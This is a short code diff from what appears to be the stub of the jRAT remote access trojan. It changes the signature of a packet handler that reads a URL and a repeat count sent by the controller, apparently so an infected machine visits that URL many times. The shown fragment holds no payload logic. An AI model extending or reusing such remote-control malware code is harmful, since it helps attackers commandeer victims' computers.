@@ -8,7 +8,7 @@ import se.jrat.stub.Connection;
 public class Packet39VisitManyURLs extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String url = Connection.instance.readLine();
 		int times = Connection.instance.readInt();
 		try {
